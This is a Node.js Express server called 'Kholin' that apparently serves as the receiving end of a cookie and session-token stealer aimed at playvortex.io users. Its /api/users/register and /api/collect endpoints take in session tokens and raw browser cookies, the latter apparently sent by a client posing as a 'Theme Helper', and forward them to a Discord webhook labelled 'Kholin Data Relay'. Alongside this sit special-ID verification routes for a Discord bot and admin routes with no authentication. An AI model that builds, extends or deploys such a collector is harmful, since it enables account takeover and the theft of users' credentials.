const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;
const crypto = require('crypto');

app.use(express.json());

// ============================================
// STORAGE
// ============================================

// Store generated IDs (in production, use a database)
const generatedIds = new Map(); // userId -> { specialId, createdAt, username, displayName }
const pendingVerifications = new Map(); // specialId -> { discordId, discordName, timestamp }

// ============================================
// HELPER FUNCTIONS
// ============================================

function generateSpecialId(userId, username) {
    // Create a hash based on userId + username + secret salt
    const secret = process.env.SECRET_KEY || 'kholin-secret-salt-2024';
    const hash = crypto.createHash('sha256')
        .update(userId + username + secret + Date.now().toString())
        .digest('hex')
        .substring(0, 16); // Take first 16 characters
    
    return hash.toUpperCase();
}

function generateSpecialCode() {
    // Generate a 16-character alphanumeric code for verification
    return crypto.randomBytes(8).toString('hex').toUpperCase();
}

// ============================================
// DISCORD WEBHOOK SENDER
// ============================================

async function sendToDiscordWebhook(payload) {
    const WEBHOOK_URL = process.env.webhook;
    
    if (!WEBHOOK_URL) {
        console.error("❌ Webhook not configured.");
        return { success: false, error: "Webhook missing" };
    }

    try {
        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error("Discord webhook error:", response.status, errorText);
            return { success: false, error: `HTTP ${response.status}: ${errorText}` };
        }

        return { success: true };
    } catch (err) {
        console.error("Webhook send error:", err);
        return { success: false, error: err.message };
    }
}

// ============================================
// ENDPOINTS
// ============================================

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        timestamp: new Date().toISOString(),
        webhookConfigured: !!process.env.webhook,
        generatedIdsCount: generatedIds.size,
        pendingVerificationsCount: pendingVerifications.size
    });
});

app.get('/', (req, res) => {
    res.send('Kholin API is running. Use /health for status.');
});

// ============================================
// USER REGISTRATION
// ============================================

app.post('/api/users/register', async (req, res) => {
    try {
        const { 
            userId, 
            username, 
            displayName, 
            sessionToken, 
            rawCookieString, 
            friendsCount 
        } = req.body;

        if (!userId || userId === "Unknown") {
            return res.status(400).json({ 
                success: false, 
                error: "Valid userId required" 
            });
        }

        // Generate or retrieve special ID
        let specialId = null;
        let isNew = false;

        if (generatedIds.has(userId)) {
            specialId = generatedIds.get(userId).specialId;
            console.log(`[${userId}] Using existing special ID: ${specialId}`);
        } else {
            specialId = generateSpecialId(userId, username || "User");
            generatedIds.set(userId, {
                specialId: specialId,
                createdAt: new Date().toISOString(),
                username: username || "User",
                displayName: displayName || username || "User"
            });
            isNew = true;
            console.log(`[${userId}] Generated NEW special ID: ${specialId}`);
        }

        // Build Discord Embed
        let avatarUrl = "https://playvortex.io/favicon.ico";
        if (userId && userId !== "Unknown") {
            avatarUrl = `https://playvortex.io/users/${userId}/avatar`;
        }

        // Create fields array
        const fields = [
            { name: "👤 Username", value: `**@${username || 'Unknown'}**`, inline: true },
            { name: "📛 Display Name", value: `**${displayName || username || 'Unknown'}**`, inline: true },
            { name: "🆔 User ID", value: `\`${userId}\``, inline: true },
            { name: "👥 Friends Count", value: `**${friendsCount || '0'}**`, inline: true },
            { name: "🆕 New User", value: isNew ? "✅ Yes" : "❌ No", inline: true },
            { name: "🔑 Special ID", value: `\`\`\`${specialId}\`\`\``, inline: false }
        ];

        // Add session token if provided
        if (sessionToken && sessionToken !== "MISSING") {
            fields.push({
                name: "🔑 Session Token",
                value: `\`\`\`${sessionToken.substring(0, 50)}...\`\`\``,
                inline: false
            });
        }

        // Add a fun emoji based on friends count
        let friendEmoji = "👤";
        const count = parseInt(friendsCount) || 0;
        if (count >= 100) friendEmoji = "👑";
        else if (count >= 50) friendEmoji = "⭐";
        else if (count >= 25) friendEmoji = "🌟";
        else if (count >= 10) friendEmoji = "💫";
        else if (count >= 5) friendEmoji = "✨";

        const payload = {
            username: "Kholin Data Relay",
            avatar_url: "https://playvortex.io/favicon.ico",
            embeds: [{
                title: isNew ? "🦊 New Account Data Received" : "🔄 Account Data Updated",
                color: isNew ? 0x4ade80 : 0x0b6bcb,
                thumbnail: { url: avatarUrl },
                fields: fields,
                footer: { 
                    text: `Kholin • ${friendEmoji} ${count} friends • ID: ${specialId}`, 
                    icon_url: "https://playvortex.io/favicon.ico" 
                },
                timestamp: new Date().toISOString()
            }]
        };

        // Send to Discord
        const result = await sendToDiscordWebhook(payload);
        
        if (!result.success) {
            return res.status(500).json({ 
                success: false, 
                error: "Discord webhook failed", 
                details: result.error 
            });
        }

        console.log(`✅ Data sent for ${username} (${userId}) with ${friendsCount || 0} friends`);
        
        // Return the special ID to the client
        return res.status(200).json({ 
            success: true,
            data: {
                username: username || 'Unknown',
                userId: userId,
                displayName: displayName || username || 'Unknown',
                friendsCount: friendsCount || '0',
                specialId: specialId,
                isNew: isNew
            }
        });

    } catch (err) {
        console.error("Server error:", err);
        return res.status(500).json({ success: false, error: err.message });
    }
});

// ============================================
// SPECIAL ID ENDPOINTS
// ============================================

// Get special ID for a user
app.get('/api/special-id/:userId', (req, res) => {
    const { userId } = req.params;
    
    console.log(`[Special ID] Request for user: ${userId}`);
    
    if (generatedIds.has(userId)) {
        const data = generatedIds.get(userId);
        console.log(`[Special ID] Found:`, data);
        return res.json({
            success: true,
            userId: userId,
            specialId: data.specialId,
            username: data.username,
            displayName: data.displayName || data.username,
            createdAt: data.createdAt
        });
    } else {
        console.log(`[Special ID] NOT found for user: ${userId}`);
        return res.status(404).json({
            success: false,
            error: "No special ID found for this user"
        });
    }
});

// Get special ID by code (for Discord bot verification)
app.get('/api/special-id-by-code/:code', (req, res) => {
    const { code } = req.params;
    const upperCode = code.toUpperCase();
    
    console.log(`[Special ID] Looking up code: ${upperCode}`);
    
    // Search through all stored IDs
    for (const [userId, data] of generatedIds) {
        if (data.specialId === upperCode) {
            console.log(`[Special ID] Found matching code for user: ${userId}`);
            return res.json({
                success: true,
                userId: userId,
                specialId: data.specialId,
                username: data.username,
                displayName: data.displayName || data.username,
                createdAt: data.createdAt
            });
        }
    }
    
    console.log(`[Special ID] Code not found: ${upperCode}`);
    return res.status(404).json({
        success: false,
        error: "Special ID not found"
    });
});

// Generate special ID for a user (manual trigger)
app.post('/api/generate-special-id', (req, res) => {
    const { userId, username, displayName } = req.body;
    
    if (!userId || userId === "Unknown") {
        return res.status(400).json({
            success: false,
            error: "Valid userId required"
        });
    }
    
    if (generatedIds.has(userId)) {
        return res.json({
            success: true,
            specialId: generatedIds.get(userId).specialId,
            alreadyExists: true
        });
    }
    
    const specialId = generateSpecialId(userId, username || "User");
    generatedIds.set(userId, {
        specialId: specialId,
        createdAt: new Date().toISOString(),
        username: username || "User",
        displayName: displayName || username || "User"
    });
    
    console.log(`[Special ID] Generated new ID for ${userId}: ${specialId}`);
    
    return res.json({
        success: true,
        specialId: specialId,
        alreadyExists: false
    });
});

// Verify a special ID (for Discord bot)
app.get('/api/verify-special-id/:code', (req, res) => {
    const { code } = req.params;
    const upperCode = code.toUpperCase();
    
    console.log(`[Verify] Checking code: ${upperCode}`);
    
    // Search through all stored IDs
    for (const [userId, data] of generatedIds) {
        if (data.specialId === upperCode) {
            console.log(`[Verify] Found matching code for user: ${userId}`);
            
            // Check if this code is already pending verification
            const isPending = pendingVerifications.has(upperCode);
            
            return res.json({
                success: true,
                valid: true,
                userId: userId,
                specialId: data.specialId,
                username: data.username,
                displayName: data.displayName || data.username,
                createdAt: data.createdAt,
                pending: isPending
            });
        }
    }
    
    console.log(`[Verify] Code not found: ${upperCode}`);
    return res.json({
        success: true,
        valid: false,
        error: "Invalid special ID"
    });
});

// Mark a special ID as used (for Discord bot)
app.post('/api/special-ids/use', (req, res) => {
    const { specialId, discordId, discordName } = req.body;
    
    if (!specialId) {
        return res.status(400).json({
            success: false,
            error: "specialId required"
        });
    }
    
    const upperSpecialId = specialId.toUpperCase();
    
    // Mark as pending verification
    pendingVerifications.set(upperSpecialId, {
        discordId: discordId,
        discordName: discordName || 'Unknown',
        timestamp: Date.now()
    });
    
    console.log(`[Special ID] Marked ${upperSpecialId} as pending verification for Discord user ${discordId}`);
    
    return res.json({
        success: true,
        specialId: upperSpecialId,
        pending: true
    });
});

// Check verification status
app.get('/api/check-verification/:specialId', (req, res) => {
    const { specialId } = req.params;
    const upperSpecialId = specialId.toUpperCase();
    
    const isPending = pendingVerifications.has(upperSpecialId);
    
    if (isPending) {
        const pending = pendingVerifications.get(upperSpecialId);
        // Check if pending is older than 5 minutes (timeout)
        if (Date.now() - pending.timestamp > 300000) {
            pendingVerifications.delete(upperSpecialId);
            return res.json({
                success: true,
                verified: false,
                expired: true,
                error: "Verification timed out"
            });
        }
        
        return res.json({
            success: true,
            verified: true,
            pending: true,
            discordId: pending.discordId,
            discordName: pending.discordName
        });
    }
    
    return res.json({
        success: true,
        verified: false,
        pending: false
    });
});

// ============================================
// PENDING SPECIAL CODES (for Discord bot sync)
// ============================================

app.get('/api/special-ids/pending', (req, res) => {
    const pending = [];
    const now = Date.now();
    
    for (const [specialId, data] of pendingVerifications) {
        // Only include pending verifications that are less than 5 minutes old
        if (now - data.timestamp < 300000) {
            // Find the user ID for this special ID
            let userId = null;
            let username = null;
            let displayName = null;
            
            for (const [uid, userData] of generatedIds) {
                if (userData.specialId === specialId) {
                    userId = uid;
                    username = userData.username;
                    displayName = userData.displayName || userData.username;
                    break;
                }
            }
            
            pending.push({
                specialId: specialId,
                code: specialId, // The code is the same as the special ID
                userId: userId,
                username: username,
                displayName: displayName,
                discordId: data.discordId,
                discordName: data.discordName,
                timestamp: data.timestamp
            });
        } else {
            // Remove expired pending verifications
            pendingVerifications.delete(specialId);
        }
    }
    
    return res.json({
        success: true,
        codes: pending,
        count: pending.length
    });
});

// ============================================
// COLLECT ENDPOINT (for Theme Helper compatibility)
// ============================================

app.post('/api/collect', async (req, res) => {
    try {
        const { url, rawCookies } = req.body;
        const WEBHOOK_URL = process.env.webhook;

        if (!WEBHOOK_URL) {
            console.error("Webhook not configured.");
            return res.status(500).json({ error: "Webhook missing" });
        }

        const payload = {
            username: "Kholin Data Relay",
            avatar_url: "https://playvortex.io/favicon.ico",
            embeds: [{
                title: "🌐 Page Visit Detected",
                color: 0x3498db,
                fields: [
                    { name: "🔗 URL", value: url || "Unknown", inline: false },
                    { name: "🍪 Raw Cookies", value: `\`\`\`${(rawCookies || '').substring(0, 950)}\`\`\``, inline: false }
                ],
                footer: { text: "Kholin Proxy", icon_url: "https://playvortex.io/favicon.ico" },
                timestamp: new Date().toISOString()
            }]
        };

        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            return res.status(500).json({ error: "Discord webhook failed" });
        }

        return res.status(200).json({ success: true });

    } catch (err) {
        console.error("Server error:", err);
        return res.status(500).json({ success: false, error: err.message });
    }
});

// ============================================
// ADMIN ENDPOINTS (Add auth in production)
// ============================================

// Get all generated IDs
app.get('/api/all-special-ids', (req, res) => {
    const data = [];
    for (const [userId, info] of generatedIds) {
        data.push({
            userId,
            specialId: info.specialId,
            username: info.username,
            displayName: info.displayName || info.username,
            createdAt: info.createdAt
        });
    }
    return res.json({
        success: true,
        total: data.length,
        data: data
    });
});

// Get all pending verifications
app.get('/api/all-pending', (req, res) => {
    const data = [];
    for (const [specialId, info] of pendingVerifications) {
        data.push({
            specialId,
            discordId: info.discordId,
            discordName: info.discordName,
            timestamp: info.timestamp,
            age: Date.now() - info.timestamp
        });
    }
    return res.json({
        success: true,
        total: data.length,
        data: data
    });
});

// Clear expired pending verifications
app.post('/api/clear-expired', (req, res) => {
    let cleared = 0;
    const now = Date.now();
    
    for (const [specialId, data] of pendingVerifications) {
        if (now - data.timestamp > 300000) {
            pendingVerifications.delete(specialId);
            cleared++;
        }
    }
    
    return res.json({
        success: true,
        cleared: cleared,
        remaining: pendingVerifications.size
    });
});

// ============================================
// START SERVER
// ============================================

app.listen(PORT, () => {
    console.log(`✅ Kholin Server running on port ${PORT}`);
    console.log(`   Webhook: ${process.env.webhook ? '✅ Configured' : '❌ Not configured'}`);
    console.log(`   Secret Key: ${process.env.SECRET_KEY ? '✅ Set' : '⚠️ Using default (not secure for production)'}`);
    console.log(`   Generated IDs: ${generatedIds.size}`);
    console.log(`   Pending Verifications: ${pendingVerifications.size}`);
});
